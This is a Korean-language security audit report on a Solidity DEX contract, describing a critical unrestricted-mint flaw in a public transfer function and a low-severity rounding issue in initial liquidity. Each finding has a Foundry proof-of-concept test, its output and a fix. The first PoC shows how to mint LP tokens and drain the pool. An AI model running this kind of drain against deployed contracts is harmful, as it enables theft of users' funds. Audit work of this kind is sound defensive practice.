# 1. DEX - 잘못된 transfer 접근 범위 설정

## 설명

<aside>

### **키워드 : Misconfiguration**

### **심각도 : Critical**

토큰을 원하는 만큼 민팅하는 함수인 transfer의 접근 범위가 public이며 별도의 제한이 존재하지 않는다.

</aside>

```solidity
function transfer(
        address to,
        uint256 lpAmount
    ) public override(ERC20, IDex) returns (bool) {
        _mint(to, lpAmount);
        return true;
    }
```

public으로 설정되어 있음에도 불구하고 별도의 검증이 존재치 않아 누구든 실행하여 LP 토큰을 발행받을 수 있다.

## PoC

```solidity
function testPoC() external {
        uint256 lp = dex.addLiquidity(1000 ether, 1000 ether, 0);
        vm.startPrank(address(0x01));
        {
            dex.transfer(address(0x01), lp * 9999);
            console.log(
                "balance : ",
                tokenX.balanceOf(address(0x01)),
                tokenY.balanceOf(address(0x01))
            );
            dex.removeLiquidity(lp, 0, 0);
            console.log(
                "balance : ",
                tokenX.balanceOf(address(0x01)),
                tokenY.balanceOf(address(0x01))
            );
        }
        vm.stopPrank();
    }
```

```solidity
Running 1 test for test/Dex.t.sol:DexTest
[PASS] testPoC() (gas: 297276)
Logs:
  balance :  0 0
  balance :  100000000000000000 100000000000000000
```

원하는 만큼 토큰을 발행받은 이후 유동성을 제거하여 DEX의 토큰을 모두 탈취할 수 있다.

## 파급력

LP 토큰을 제한 없이 무한정 찍어낼 수 있으며, 어떠한 조건도 필요 없기에 위험도는 매우 높다고 할 수 있다.

## 해결방법

```solidity
function transfer(
        address to,
        uint256 lpAmount
    ) public override(ERC20, IDex) returns (bool) {
        require(msg.sender == address(this), "permission denied");
        _mint(to, lpAmount);
        return true;
    }
```

다음과 같이 DEX 컨트랙트에서만 호출 가능하게 설정하거나, private으로 설정하여 접근 범위를 제한해야 한다.

# 2. DEX - addLiquidity 초기 공급 시 round down 발생

## 설명

<aside>

### **키워드 : Numeric issue(Round down)**

### **심각도 : Low**

초기 유동성 공급 과정에서 내림(round down)이 발생할 수 있고, 이로 인해 LP토큰 발행량과 실제 유동성 풀의 싱크가 깨지게 되어 이후 유저들 또한 손해를 볼 수 있다.

</aside>

```solidity
uint public constant MINIMUM_LIQUIDITY = 10**3;

if (_totalSupply == 0) {
            LPTokenAmount = _sqrt((tokenXAmount + reserveX) * (tokenYAmount + reserveY) / MINIMUM_LIQUIDITY);
        }
```

초회 공급시 공급된 토큰들의 전체 가치를 `MINIMUM_LIQUIDITY` 상수로 나누어 저장한다. 이 과정에서 999 wei 이하는 모두 삭제되어 LP Token이 발행된다.

따라서 초회 유동성 공급시 공급량에 비해 적은 양의 토큰을 발급받게 된다.

```solidity
LPTokenAmount = _min(_totalSupply * tokenXAmount / reserveX, _totalSupply * tokenYAmount / reserveY);
```

이후 유동성을 공급하는 유저들도 LP토큰 발행량과 유동성 풀에 존재하는 수치의 싱크가 맞지 않기에(유동성 풀이 round down되어 사라진 만큼 항상 큰 상태가 유지됨) 유동성을 제거할 때 토큰의 가치가 적게 책정된다.

## PoC

```solidity
function testPoC() external {
        uint lp1 = dex.addLiquidity(25 ether, 25 ether, 0);
        emit log_named_uint("LP1", lp1);

        tokenX.transfer(address(0x01), 100 ether);
        tokenY.transfer(address(0x01), 100 ether);

        vm.startPrank(address(0x01));
        {
            tokenX.approve(address(dex), 100 ether);
            tokenY.approve(address(dex), 100 ether);
            uint lp2 = dex.addLiquidity(10 ether, 10 ether, 0);
            emit log_named_uint("LP2", lp2);
            (uint rx, uint ry) = dex.removeLiquidity(lp2, 0, 0);
            emit log_named_uint("lp2:rx", rx);
            emit log_named_uint("lp2:ry", ry);
        }
        vm.stopPrank();
        (uint rx, uint ry) = dex.removeLiquidity(lp1, 0, 0);
        emit log_named_uint("rx", rx);
        emit log_named_uint("ry", ry);
    }
```

```solidity
Running 1 test for test/Dex.t.sol:DexTest
[PASS] testPoC() (gas: 311714)
Logs:
  LP1: 790569415042094832
  LP2: 316227766016837932
  lp2:rx: 9999999999999999981
  lp2:ry: 9999999999999999981
  rx: 25000000000000000019
  ry: 25000000000000000019
```

발행된 토큰 수와 유동성 풀이 일치하지 않기에 공급량을 제거할 때 토큰이 실제 가치보다 낮게 책정됨을 알 수 있다.

## 파급력

초기 공급량(두 토큰 공급량의 곱, `(tokenXAmount + reserveX) * (tokenYAmount + reserveY)` )이 10^3의 제곱수가 아니면 발생할 수 있는 버그이다. 따라서 발현 난이도는 매우 낮다고 볼 수 있다.

이후 LP 토큰을 교환하는 모든 유저들에게 손해가 고스란히 가게 되어 있는 구조이지만 이를 통해 손해만 볼 뿐 추가적인 이득을 취할 수는 없기에 위험도는 낮음으로 책정하였다.

## 해결 방법

```solidity
if (_totalSupply == 0) {
            LPTokenAmount = _sqrt(
                ((tokenXAmount + reserveX) * (tokenYAmount + reserveY))
            );
        }
```

`MINIMUM_LIQUIDITY` 는 필요 없으며 round down만 발생시키는 연산이므로 제거한다.
